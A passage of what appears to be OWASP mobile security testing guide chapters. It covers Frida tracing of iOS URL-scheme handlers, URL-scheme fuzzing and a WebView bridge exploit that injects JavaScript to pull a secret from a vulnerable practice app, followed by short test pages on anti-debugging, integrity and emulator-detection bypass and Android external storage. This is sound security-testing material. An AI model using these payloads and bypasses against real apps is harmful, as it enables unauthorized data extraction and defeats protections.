The output is truncated for better readability. This time you see that `UIApplicationOpenURLOptionsSourceApplicationKey` has changed to `OWASP.iGoat-Swift`, which makes sense. In addition, a long list of `openURL`-like methods were called. Considering this information can be very useful for some scenarios as it will help you to decide what you next steps will be, e.g. which method you will hook or tamper with next.

#### Opening a Link by Navigating to a Page and Letting Safari Open It

You can now test the same situation when clicking on a link contained on a page. Safari will identify and process the URL scheme and choose which action to execute. Opening this link "<https://telegram.me/fridadotre>" will trigger this behavior.

<img src="Images/Chapters/0x06h/open_in_telegram_via_urlscheme.png" width="400px" />

First of all we let frida-trace generate the stubs for us:

```bash
$ frida-trace -U Telegram -m "*[* *restorationHandler*]" -i "*open*Url*"
    -m "*[* *application*URL*]" -m "*[* openURL]"

...
7310 ms  -[UIApplication _applicationOpenURLAction: 0x1c44ff900 payload: 0x10c5ee4c0 origin: 0x0]
7311 ms     | -[AppDelegate application: 0x105a59980 openURL: 0x1c46ebb80 options: 0x1c0e222c0]
7312 ms     | $S10TelegramUI15openExternalUrl7account7context3url05forceD016presentationData
            18applicationContext20navigationController12dismissInputy0A4Core7AccountC_AA14Open
            URLContextOSSSbAA012PresentationK0CAA0a11ApplicationM0C7Display010NavigationO0CSgyyctF()
```

Now we can simply modify by hand the stubs we are interested in:

- The Objective-C method `application:openURL:options:`:

    ```javascript
    // __handlers__/__AppDelegate_application_openUR_3679fadc.js

    onEnter: function (log, args, state) {
        log("-[AppDelegate application: " + args[2] +
                    " openURL: " + args[3] + " options: " + args[4] + "]");
        log("\tapplication :" + ObjC.Object(args[2]).toString());
        log("\topenURL :" + ObjC.Object(args[3]).toString());
        log("\toptions :" + ObjC.Object(args[4]).toString());
    },
    ```

- The Swift method `$S10TelegramUI15openExternalUrl...`:

    ```javascript
    // __handlers__/TelegramUI/_S10TelegramUI15openExternalUrl7_b1a3234e.js

    onEnter: function (log, args, state) {

        log("TelegramUI.openExternalUrl(account, url, presentationData," +
                    "applicationContext, navigationController, dismissInput)");
        log("\taccount: " + ObjC.Object(args[1]).toString());
        log("\turl: " + ObjC.Object(args[2]).toString());
        log("\tpresentationData: " + args[3]);
        log("\tapplicationContext: " + ObjC.Object(args[4]).toString());
        log("\tnavigationController: " + ObjC.Object(args[5]).toString());
    },
    ```

The next time we run it, we see the following output:

```javascript
$ frida-trace -U Telegram -m "*[* *restorationHandler*]" -i "*open*Url*"
    -m "*[* *application*URL*]" -m "*[* openURL]"

  8144 ms  -[UIApplication _applicationOpenURLAction: 0x1c44ff900 payload: 0x10c5ee4c0 origin: 0x0]
  8145 ms     | -[AppDelegate application: 0x105a59980 openURL: 0x1c46ebb80 options: 0x1c0e222c0]
  8145 ms     |     application: <Application: 0x105a59980>
  8145 ms     |     openURL: tg://resolve?domain=fridadotre
  8145 ms     |     options :{
                        UIApplicationOpenURLOptionsOpenInPlaceKey = 0;
                        UIApplicationOpenURLOptionsSourceApplicationKey = "com.apple.mobilesafari";
                    }
  8269 ms     |    | TelegramUI.openExternalUrl(account, url, presentationData,
                                        applicationContext, navigationController, dismissInput)
  8269 ms     |    |    account: nil
  8269 ms     |    |    url: tg://resolve?domain=fridadotre
  8269 ms     |    |    presentationData: 0x1c4c51741
  8269 ms     |    |    applicationContext: nil
  8269 ms     |    |    navigationController: TelegramUI.PresentationData
  8274 ms     | -[UIApplication applicationOpenURL:0x1c46ebb80]
```

There you can observe the following:

- It calls `application:openURL:options:` from the app delegate as expected.
- The source application is Safari ("com.apple.mobilesafari").
- `application:openURL:options:` handles the URL but does not open it, it calls `TelegramUI.openExternalUrl` for that.
- The URL being opened is `tg://resolve?domain=fridadotre`.
- It uses the `tg://` custom URL scheme from Telegram.

It is interesting to see that if you navigate again to "<https://telegram.me/fridadotre>", click on **cancel** and then click on the link offered by the page itself ("Open in the Telegram app"), instead of opening via custom URL scheme it will open via universal links.

<img src="Images/Chapters/0x06h/open_in_telegram_via_universallink.png" width="400px" />

You can try this while tracing both methods:

```javascript
$ frida-trace -U Telegram -m "*[* *restorationHandler*]" -m "*[* *application*openURL*options*]"

// After clicking "Open" on the pop-up

 16374 ms  -[AppDelegate application :0x10556b3c0 openURL :0x1c4ae0080 options :0x1c7a28400]
 16374 ms   application :<Application: 0x10556b3c0>
 16374 ms   openURL :tg://resolve?domain=fridadotre
 16374 ms   options :{
    UIApplicationOpenURLOptionsOpenInPlaceKey = 0;
    UIApplicationOpenURLOptionsSourceApplicationKey = "com.apple.mobilesafari";
}

// After clicking "Cancel" on the pop-up and "OPEN" in the page

406575 ms  -[AppDelegate application:0x10556b3c0 continueUserActivity:0x1c063d0c0
                restorationHandler:0x16f27a898]
406575 ms  application:<Application: 0x10556b3c0>
406575 ms  continueUserActivity:<NSUserActivity: 0x1c063d0c0>
406575 ms       webpageURL:https://telegram.me/fridadotre
406575 ms       activityType:NSUserActivityTypeBrowsingWeb
406575 ms       userInfo:{
}
406575 ms  restorationHandler:<__NSStackBlock__: 0x16f27a898>
```

#### Testing for Deprecated Methods

Search for deprecated methods like:

- [`application:handleOpenURL:`](https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1622964-application?language=objc "UIApplicationDelegate application:handleOpenURL:")
- [`openURL:`](https://developer.apple.com/documentation/uikit/uiapplication/1622961-openurl?language=objc "UIApplication openURL:")
- [`application:openURL:sourceApplication:annotation:`](https://developer.apple.com/documentation/uikit/uiapplicationdelegate/1623073-application "UIApplicationDelegate application:openURL:sourceApplication:annotation:")

You may simply use frida-trace for this, to see if any of those methods are being used.

### Testing URL Schemes Source Validation

A way to discard or confirm validation could be by hooking typical methods that might be used for that. For example [`isEqualToString:`](https://developer.apple.com/documentation/foundation/nsstring/1407803-isequaltostring "NSString isEqualToString:"):

```javascript
// - (BOOL)isEqualToString:(NSString *)aString;

var isEqualToString = ObjC.classes.NSString["- isEqualToString:"];

Interceptor.attach(isEqualToString.implementation, {
  onEnter: function(args) {
    var message = ObjC.Object(args[2]);
    console.log(message)
  }
});
```

If we apply this hook and call the URL scheme again:

```javascript
$ frida -U iGoat-Swift

[iPhone::iGoat-Swift]-> var isEqualToString = ObjC.classes.NSString["- isEqualToString:"];

                    Interceptor.attach(isEqualToString.implementation, {
                      onEnter: function(args) {
                        var message = ObjC.Object(args[2]);
                        console.log(message)
                      }
                    });
{}
[iPhone::iGoat-Swift]-> openURL("iGoat://?contactNumber=123456789&message=hola")
true
nil
```

Nothing happens. This tells us already that this method is not being used for that as we cannot find any _app-package-looking_ string like `OWASP.iGoat-Swift` or `com.apple.mobilesafari` between the hook and the text of the tweet. However, consider that we are just probing one method, the app might be using other approach for the comparison.

### Fuzzing URL Schemes

If the app parses parts of the URL, you can also perform input fuzzing to detect memory corruption bugs.

What we have learned above can be now used to build your own fuzzer on the language of your choice, e.g. in Python and call the `openURL` using [Frida's RPC](https://www.frida.re/docs/javascript-api/#rpc "Frida\'s RPC (JavaScript API)"). That fuzzer should do the following:

- Generate payloads.
- For each of them call `openURL`.
- Check if the app generates a crash report (`.ips`) in `/private/var/mobile/Library/Logs/CrashReporter`.

The [FuzzDB](https://github.com/fuzzdb-project/fuzzdb "FuzzDB") project offers fuzzing dictionaries that you can use as payloads.

#### Using Frida

Doing this with Frida is pretty easy, as explained in this [blog post](https://grepharder.github.io/blog/0x03_learning_about_universal_links_and_fuzzing_url_schemes_on_ios_with_frida.html "Learning about Universal Links and Fuzzing URL Schemes on iOS with Frida") to see an example that fuzzes the @MASTG-APP-0028 app (working on iOS 11.1.2).

Before running the fuzzer we need the URL schemes as inputs. From the static analysis we know that the iGoat-Swift app supports the following URL scheme and parameters: `iGoat://?contactNumber={0}&message={0}`.

```bash
$ frida -U SpringBoard -l ios-url-scheme-fuzzing.js
[iPhone::SpringBoard]-> fuzz("iGoat", "iGoat://?contactNumber={0}&message={0}")
Watching for crashes from iGoat...
No logs were moved.
Opened URL: iGoat://?contactNumber=0&message=0
OK!
Opened URL: iGoat://?contactNumber=1&message=1
OK!
Opened URL: iGoat://?contactNumber=-1&message=-1
OK!
Opened URL: iGoat://?contactNumber=null&message=null
OK!
Opened URL: iGoat://?contactNumber=nil&message=nil
OK!
Opened URL: iGoat://?contactNumber=99999999999999999999999999999999999
&message=99999999999999999999999999999999999
OK!
Opened URL: iGoat://?contactNumber=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
...
&message=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
...
OK!
Opened URL: iGoat://?contactNumber=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
...
&message=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
...
OK!
Opened URL: iGoat://?contactNumber='&message='
OK!
Opened URL: iGoat://?contactNumber=%20d&message=%20d
OK!
Opened URL: iGoat://?contactNumber=%20n&message=%20n
OK!
Opened URL: iGoat://?contactNumber=%20x&message=%20x
OK!
Opened URL: iGoat://?contactNumber=%20s&message=%20s
OK!
```

The script will detect if a crash occurred. On this run it did not detect any crashed but for other apps this could be the case. We would be able to inspect the crash reports in `/private/var/mobile/Library/Logs/CrashReporter` or in `/tmp` if it was moved by the script.
## Determining Whether Native Methods Are Exposed Through WebViews

## Overview

## Static Analysis

### Testing UIWebView JavaScript to Native Bridges

Search for code that maps native objects to the `JSContext` associated with a WebView and analyze what functionality it exposes, for example no sensitive data should be accessible and exposed to WebViews.

In Objective-C, the `JSContext` associated with a `UIWebView` is obtained as follows:

```objectivec

[webView valueForKeyPath:@"documentView.webView.mainFrame.javaScriptContext"]

```

### Testing WKWebView JavaScript to Native Bridges

Verify if a JavaScript to native bridge exists by searching for `WKScriptMessageHandler` and check all exposed methods. Then verify how the methods are called.

The following example from ["Where's My Browser?"](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/b8d4abda4000aa509c7a5de79e5c90360d1d0849/WheresMyBrowser/WKWebViewPreferencesManager.swift#L98 "Where\'s My Browser? WKWebViewPreferencesManager.swift Line 98") demonstrates this.

First we see how the JavaScript bridge is enabled:

```swift
func enableJavaScriptBridge(_ enabled: Bool) {
    options_dict["javaScriptBridge"]?.value = enabled
    let userContentController = wkWebViewConfiguration.userContentController
    userContentController.removeScriptMessageHandler(forName: "javaScriptBridge")

    if enabled {
            let javaScriptBridgeMessageHandler = JavaScriptBridgeMessageHandler()
            userContentController.add(javaScriptBridgeMessageHandler, name: "javaScriptBridge")
    }
}
```

Adding a script message handler with name `"name"` (or `"javaScriptBridge"` in the example above) causes the JavaScript function `window.webkit.messageHandlers.myJavaScriptMessageHandler.postMessage` to be defined in all frames in all web views that use the user content controller. It can be then [used from the HTML file like this](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/d4e2d9efbde8841bf7e4a8800418dda6bb116ec6/WheresMyBrowser/web/WKWebView/scenario3.html#L33 "Where\'s My Browser? WKWebView/scenario3.html Line 33"):

```javascript
function invokeNativeOperation() {
    value1 = document.getElementById("value1").value
    value2 = document.getElementById("value2").value
    window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers", value1, value2]);
}
```

The called function resides in [`JavaScriptBridgeMessageHandler.swift`](https://github.com/authenticationfailure/WheresMyBrowser.iOS/blob/b8d4abda4000aa509c7a5de79e5c90360d1d0849/WheresMyBrowser/JavaScriptBridgeMessageHandler.swift#L29 "Where\'s My Browser? JavaScriptBridgeMessageHandler.swift Line 29"):

```swift
class JavaScriptBridgeMessageHandler: NSObject, WKScriptMessageHandler {

//...

case "multiplyNumbers":

        let arg1 = Double(messageArray[1])!
        let arg2 = Double(messageArray[2])!
        result = String(arg1 * arg2)
//...

let javaScriptCallBack = "javascriptBridgeCallBack('\(functionFromJS)','\(result)')"
message.webView?.evaluateJavaScript(javaScriptCallBack, completionHandler: nil)
```

The problem here is that the `JavaScriptBridgeMessageHandler` not only contains that function, it also exposes a sensitive function:

```swift
case "getSecret":
        result = "XSRSOGKC342"
```

## Dynamic Analysis

At this point you've surely identified all potentially interesting WebViews in the iOS app and got an overview of the potential attack surface (via static analysis, the dynamic analysis techniques that we have seen in previous sections or a combination of them). This would include HTML and JavaScript files, usage of the `JSContext` / `JSExport` for `UIWebView` and `WKScriptMessageHandler` for `WKWebView`, as well as which functions are exposed and present in a WebView.

Further dynamic analysis can help you exploit those functions and get sensitive data that they might be exposing. As we have seen in the static analysis, in the previous example it was trivial to get the secret value by performing reverse engineering (the secret value was found in plain text inside the source code) but imagine that the exposed function retrieves the secret from secure storage. In this case, only dynamic analysis and exploitation would help.

The procedure for exploiting the functions starts with producing a JavaScript payload and injecting it into the file that the app is requesting. The injection can be accomplished via various techniques, for example:

- If some of the content is loaded insecurely from the Internet over HTTP (mixed content), you can try to implement a MITM attack.
- You can always perform dynamic instrumentation and inject the JavaScript payload by using frameworks like Frida and the corresponding JavaScript evaluation functions available for the iOS WebViews ([`stringByEvaluatingJavaScriptFromString:`](https://developer.apple.com/documentation/uikit/uiwebview/1617963-stringbyevaluatingjavascriptfrom?language=objc "UIWebView stringByEvaluatingJavaScriptFromString:") for `UIWebView` and [`evaluateJavaScript:completionHandler:`](https://developer.apple.com/documentation/webkit/wkwebview/1415017-evaluatejavascript?language=objc "WKWebView evaluateJavaScript:completionHandler:") for `WKWebView`).

In order to get the secret from the previous example of the "Where's My Browser?" app, you can use one of these techniques to inject the following payload that will reveal the secret by writing it to the "result" field of the WebView:

```javascript
function javascriptBridgeCallBack(name, value) {
    document.getElementById("result").innerHTML=value;
};
window.webkit.messageHandlers.javaScriptBridge.postMessage(["getSecret"]);
```

Of course, you may also use the Exploitation Helper it provides:

<img src="Images/Chapters/0x06h/exploit_javascript_bridge.png" width="400px" />

See another example for a vulnerable iOS app and function that is exposed to a WebView in [#thiel2] page 156.
## Testing Object Persistence

## Overview

## Static Analysis

All different flavors of object persistence share the following concerns:

- If you use object persistence to store sensitive information on the device, then make sure that the data is encrypted: either at the database level, or specifically at the value level.
- Need to guarantee the integrity of the information? Use an HMAC mechanism or sign the information stored. Always verify the HMAC/signature before processing the actual information stored in the objects.
- Make sure that keys used in the two notions above are safely stored in the KeyChain and well protected. See the chapter "[Data Storage on iOS](../../../Document/0x06d-Testing-Data-Storage.md)" for more details.
- Ensure that the data within the deserialized object is carefully validated before it is actively used (e.g., no exploit of business/application logic is possible).
- Do not use persistence mechanisms that use [Runtime Reference](https://developer.apple.com/documentation/objectivec/objective-c_runtime "Objective-C Runtime Reference") to serialize/deserialize objects in high-risk applications, as the attacker might be able to manipulate the steps to execute business logic via this mechanism (see the chapter "[iOS Anti-Reversing Defenses](../../../Document/0x06j-Testing-Resiliency-Against-Reverse-Engineering.md)" for more details).
- Note that in Swift 2 and beyond, a [Mirror](https://developer.apple.com/documentation/swift/mirror "Mirror") can be used to read parts of an object, but cannot be used to write against the object.

## Dynamic Analysis

There are several ways to perform dynamic analysis:

- For the actual persistence: Use the techniques described in the "Data Storage on iOS" chapter.
- For the serialization itself: Use a debug build or use Frida / objection to see how the serialization methods are handled (e.g., whether the application crashes or extra information can be extracted by enriching the objects).
## Testing Enforced Updating

## Overview

## Static Analysis

First see whether there is an update mechanism at all: if it is not yet present, it might mean that users cannot be forced to update.
If the mechanism is present, see whether it enforces "always latest" and whether that is indeed in line with the business strategy. Otherwise check if the mechanism is supporting to update to a given version.
Make sure that every entry of the application goes through the updating mechanism in order to make sure that the update-mechanism cannot be bypassed.

## Dynamic analysis

In order to test for proper updating: try downloading an older version of the application with a security vulnerability, either by a release from the developers or by using a third party app-store.
Next, verify whether or not you can continue to use the application without updating it. If an update prompt is given, verify if you can still use the application by canceling the prompt or otherwise circumventing it through normal application usage. This includes validating whether the backend will stop calls to vulnerable backends and/or whether the vulnerable app-version itself is blocked by the backend.
Lastly, try modifying the version number of an app while intercepting its traffic using a [Machine-in-the-Middle (MITM)](../../../Document/0x04f-Testing-Network-Communication.md#intercepting-network-traffic-through-mitm) proxy, and observe how the backend responds (including whether the change is recorded, for example).
## Testing for Debugging Code and Verbose Error Logging

## Overview

## Static Analysis

You can take the following static analysis approach for the logging statements:

1. Import the application's code into Xcode.
2. Search the code for the following printing functions: `NSLog`, `println`, `print`, `dump`, `debugPrint`.
3. When you find one of them, determine whether the developers used a wrapping function around the logging function for better mark up of the statements to be logged; if so, add that function to your search.
4. For every result of steps 2 and 3, determine whether macros or debug-state related guards have been set to turn the logging off in the release build. Please note the change in how Objective-C can use preprocessor macros:

```objectivec
#ifdef DEBUG
    // Debug-only code
#endif
```

The procedure for enabling this behavior in Swift has changed: you need to either set environment variables in your scheme or set them as custom flags in the target's build settings. Please note that the following functions (which allow you to determine whether the app was built in the Swift 2.1. release-configuration) aren't recommended, as Xcode 8 and Swift 3 don't support these functions:

- `_isDebugAssertConfiguration`
- `_isReleaseAssertConfiguration`
- `_isFastAssertConfiguration`.

Depending on the application's setup, there may be more logging functions. For example, when [CocoaLumberjack](https://github.com/CocoaLumberjack/CocoaLumberjack "CocoaLumberjack") is used, static analysis is a bit different.

For the "debug-management" code (which is built-in): inspect the storyboards to see whether there are any flows and/or view-controllers that provide functionality different from the functionality the application should support. This functionality can be anything from debug views to printed error messages, from custom stub-response configurations to logs written to files on the application's file system or a remote server.

As a developer, incorporating debug statements into your application's debug version should not be a problem as long as you make sure that the debug statements are never present in the application's release version.

In Objective-C, developers can use preprocessor macros to filter out debug code:

```objectivec
#ifdef DEBUG
    // Debug-only code
#endif
```

In Swift 2 (with Xcode 7), you have to set custom compiler flags for every target, and compiler flags have to start with "-D". So you can use the following annotations when the debug flag `DMSTG-DEBUG` is set:

```objectivec
#if MSTG_DEBUG
    // Debug-only code
#endif
```

In Swift 3 (with Xcode 8), you can set Active Compilation Conditions in Build settings/Swift compiler - Custom flags. Instead of a preprocessor, Swift 3 uses [conditional compilation blocks](https://developer.apple.com/library/content/documentation/Swift/Conceptual/BuildingCocoaApps/InteractingWithCAPIs.html#//apple_ref/doc/uid/TP40014216-CH8-ID34 "Swift conditional compilation blocks") based on the defined conditions:

```objectivec
#if DEBUG_LOGGING
    // Debug-only code
#endif
```

## Dynamic Analysis

Dynamic analysis should be executed on both a simulator and a device because developers sometimes use target-based functions (instead of functions based on a release/debug-mode) to execute the debugging code.

1. Run the application on a simulator and check for output in the console during the app's execution.
2. Attach a device to your Mac, run the application on the device via Xcode, and check for output in the console during the app's execution.

For the other "manager-based" debug code: click through the application on both a simulator and a device to see if you can find any functionality that allows an app's profiles to be pre-set, allows the actual server to be selected or allows responses from the API to be selected.
## Memory Corruption Bugs

## Overview

## Static Analysis

Are there native code parts? If so: check for the given issues in the general memory corruption section. Native code is a little harder to spot when compiled. If you have the sources then you can see that C files use .c source files and .h header files and C++ uses .cpp files and .h files. This is a little different from the .swift and the .m source files for Swift and Objective-C. These files can be part of the sources, or part of third party libraries, registered as frameworks and imported through various tools, such as Carthage, the Swift Package Manager or Cocoapods.

For any managed code (Objective-C / Swift) in the project, check the following items:

- The doubleFree issue: when `free` is called twice for a given region instead of once.
- Retaining cycles: look for cyclic dependencies by means of strong references of components to one another which keep materials in memory.
- Using instances of `UnsafePointer` can be managed wrongly, which will allow for various memory corruption issues.
- Trying to manage the reference count to an object by `Unmanaged` manually, leading to wrong counter numbers and a too late/too soon release.

[A great talk is given on this subject at Realm academy](https://academy.realm.io/posts/russ-bishop-unsafe-swift/ "Russh Bishop on Unsafe Swift") and [a nice tutorial to see what is actually happening](https://www.raywenderlich.com/780-unsafe-swift-using-pointers-and-interacting-with-c "Unsafe Swift: Using Pointers And Interacting With C") is provided by Ray Wenderlich on this subject.

!!! note
    With Swift 5, you can only deallocate full blocks, which means the playground has changed a bit.

## Dynamic Analysis

There are various tools provided which help to identify memory bugs within Xcode, such as the Debug Memory graph introduced in Xcode 8 and the Allocations and Leaks instrument in Xcode.

Next, you can check whether memory is freed too fast or too slow by enabling `NSAutoreleaseFreedObjectCheckEnabled`, `NSZombieEnabled`, `NSDebugEnabled` in Xcode while testing the application.

See @MASTG-KNOW-0060 for more details on memory corruption bugs in iOS applications.
## Testing Anti-Debugging Detection

## Overview

In order to test for anti-debugging detection you can try to attach a debugger to the app and see what happens.

The app should respond in some way. For example by:

- Alerting the user and asking for accepting liability.
- Preventing execution by gracefully terminating.
- Securely wiping any sensitive data stored on the device.
- Reporting to a backend server, e.g, for fraud detection.

Try to hook or reverse engineer the app using the methods from section ["Anti-Debugging Detection"](../../../Document/0x05j-Testing-Resiliency-Against-Reverse-Engineering.md#anti-debugging).

Next, work on bypassing the detection and answer the following questions:

- Can the mechanisms be bypassed trivially (e.g., by hooking a single API function)?
- How difficult is identifying the detection code via static and dynamic analysis?
- Did you need to write custom code to disable the defenses? How much time did you need?
- What is your assessment of the difficulty of bypassing the mechanisms?
## Testing File Integrity Checks

## Overview

**Application Source Code Integrity Checks:**

Run the app on the device in an unmodified state and make sure that everything works. Then apply some patches to the executable (e.g. see @MASTG-TECH-0090), re-sign the app (@MASTG-TECH-0092), and run it.

The app should respond in some way. For example by:

- Alerting the user and asking for accepting liability.
- Preventing execution by gracefully terminating.
- Securely wiping any sensitive data stored on the device.
- Reporting to a backend server, e.g, for fraud detection.

Work on bypassing the defenses and answer the following questions:

- Can the mechanisms be bypassed trivially (e.g., by hooking a single API function)?
- How difficult is identifying the detection code via static and dynamic analysis?
- Did you need to write custom code to disable the defenses? How much time did you need?
- What is your assessment of the difficulty of bypassing the mechanisms?

**File Storage Integrity Checks:**

Go to the app data directories as indicated in @MASTG-TECH-0059 and modify some files.

Next, work on bypassing the defenses and answer the following questions:

- Can the mechanisms be bypassed trivially (e.g., by changing the contents of a file or a key-value pair)?
- How difficult is obtaining the HMAC key or the asymmetric private key?
- Did you need to write custom code to disable the defenses? How much time did you need?
- What is your assessment of the difficulty of bypassing the mechanisms?
## Testing Reverse Engineering Tools Detection

## Overview

Launch the app with various reverse engineering tools and frameworks installed on your test device, such as @MASTG-TOOL-0031, @MASTG-TOOL-0139, or @MASTG-TOOL-0066.

The app should respond in some way to the presence of those tools. For example by:

- Alerting the user and asking for accepting liability.
- Preventing execution by gracefully terminating.
- Securely wiping any sensitive data stored on the device.
- Reporting to a backend server, e.g, for fraud detection.

Next, work on bypassing the detection of the reverse engineering tools and answer the following questions:

- Can the mechanisms be bypassed trivially (e.g., by hooking a single API function)?
- How difficult is identifying the detection code via static and dynamic analysis?
- Did you need to write custom code to disable the defenses? How much time did you need?
- What is your assessment of the difficulty of bypassing the mechanisms?
## Testing Emulator Detection

## Overview

In order to test for emulator detection you can try to run the app on different emulators as indicated in section ["Emulator Detection"](../../../Document/0x06j-Testing-Resiliency-Against-Reverse-Engineering.md#emulator-detection) and see what happens.

The app should respond in some way. For example by:

- Alerting the user and asking for accepting liability.
- Preventing execution by gracefully terminating.
- Reporting to a backend server, e.g, for fraud detection.

You can also reverse engineer the app using ideas for strings and methods from section ["Emulator Detection"](../../../Document/0x06j-Testing-Resiliency-Against-Reverse-Engineering.md#emulator-detection).

Next, work on bypassing this detection and answer the following questions:

- Can the mechanisms be bypassed trivially (e.g., by hooking a single API function)?
- How difficult is identifying the detection code via static and dynamic analysis?
- Did you need to write custom code to disable the defenses? How much time did you need?
- What is your assessment of the difficulty of bypassing the mechanisms?
## Testing Obfuscation

## Overview

Attempt to disassemble the Mach-O in the IPA and any included library files in the "Frameworks" directory (.dylib or .framework files), and perform static analysis. At the very least, the app's core functionality (i.e., the functionality meant to be obfuscated) shouldn't be easily discerned. Verify that:

- meaningful identifiers, such as class names, method names, and variable names, have been discarded.
- string resources and strings in binaries are encrypted.
- code and data related to the protected functionality is encrypted, packed, or otherwise concealed.

For a more detailed assessment, you need a detailed understanding of the relevant threats and the obfuscation methods used.
## Files Written to External Storage

## Overview

The goal of this test is to retrieve the files written to the external storage (@MASTG-KNOW-0042) and inspect them regardless of the APIs used to write them. It uses a simple approach based on file retrieval from the device storage (@MASTG-TECH-0002) before and after the app is exercised to identify the files created during the app's execution and to check if they contain sensitive data.

## Steps

1. Make sure you have @MASTG-TOOL-0004 installed.
2. Install the app (@MASTG-TECH-0005).
3. Before running the app, get the current list of files (@MASTG-TECH-0002) in the external storage.
4. Exercise the app.
5. After running the app, retrieve the list of files in the external storage again.
6. Calculate the difference between the two lists.

## Observation

The output should contain a list of files that were created on the external storage during the app's execution.

## Evaluation

The test case fails if the files found above are not encrypted and leak sensitive data.

To confirm this, you can reverse engineer the app(@MASTG-TECH-0017) and inspect the code(@MASTG-TECH-0023).
## Runtime Use of APIs to Access External Storage

## Overview

Android apps use a variety of APIs to access the external storage (@MASTG-KNOW-0042). Collecting a comprehensive list of these APIs can be challenging, especially if an app uses a third-party framework, loads code at runtime, or includes native code. The most effective approach to testing applications that write to device storage is usually dynamic analysis, and specifically method tracing (@MASTG-TECH-0033).

## Steps

1. Make sure you have @MASTG-TOOL-0001 installed.
2. Install the app.
3. Execute a script to spawn the app with Frida and log all interactions with files.
4. Navigate to the screen of the app that you want to analyse.
5. Close the app to stop Frida.

The Frida script should log all file interactions by hooking into the relevant APIs such as `getExternalStorageDirectory`, `getExternalStoragePublicDirectory`, `getExternalFilesDir` or `FileOutPutStream`. You could also use `open` as a catch-all for file interactions. However, this won't catch all file interactions, such as those that use the `MediaStore` API and should be done with additional filtering as it can generate a lot of noise.

## Observation

The output should contain a list of files that the app wrote to the external storage during execution and, if possible, the APIs used to write them.

## Evaluation

The test case fails if the files found above are not encrypted and leak sensitive data.

To confirm this, you can manually inspect the files using adb shell (@MASTG-TECH-0002) to retrieve them from the device, and reverse engineer the app (@MASTG-TECH-0017) and inspect the code (@MASTG-TECH-0023).
## References to APIs and Permissions for Accessing External Storage

## Overview

This test uses static analysis to look for uses of APIs allowing an app to write to locations that are shared with other apps (@MASTG-TEST-0001) such as the External Storage APIs or the `MediaStore` API as well as the relevant Android manifest storage-related permissions. Refer to @MASTG-KNOW-0042 for more information.

This static test is great for identifying all code locations where the app is writing data to shared storage. However, it does not provide the actual data being written, and in some cases, the actual path in the device storage where the data is being written. Therefore, it is recommended to combine this test with others that take a dynamic approach, as this will provide a more complete view of the data being written to shared storage.

## Steps

1. Reverse engineer the app (@MASTG-TECH-0017).
2. Run a static analysis (@MASTG-TECH-0014) tool on the reverse engineered app targeting calls to any external storage APIs and Android manifest storage permissions.

The static analysis tool should be able to identify all possible APIs and permissions used to write to shared storage, such as `getExternalStoragePublicDirectory`, `getExternalStorageDirectory`, `getExternalFilesDir`, `MediaStore`, `WRITE_EXTERNAL_STORAGE`, and `MANAGE_EXTERNAL_STORAGE`. See the [Android documentation](https://developer.android.com/training/data-storage/shared) for more information on these APIs and permissions.

## Observation

The output should contain a list of APIs and storage-related permissions used to write to shared storage and their code locations.

## Evaluation

The test case fails if:

- the app has the proper permissions declared in the Android manifest (e.g. `WRITE_EXTERNAL_STORAGE`, `MANAGE_EXTERNAL_STORAGE`, etc.)
- **and** the data being written to shared storage is sensitive and not encrypted.

To determine the latter, you may need to carefully review the reversed code (@MASTG-TECH-0023) and/or combine this test with others that take a dynamic approach, as this will provide a more complete view of the data being written to shared storage.

## References

- [Manage all files on a storage device](https://developer.android.com/training/data-storage/manage-all-files)
- [Access media files from shared storage](https://developer.android.com/training/data-storage/shared/media)
## Runtime Use of Logging APIs

## Overview

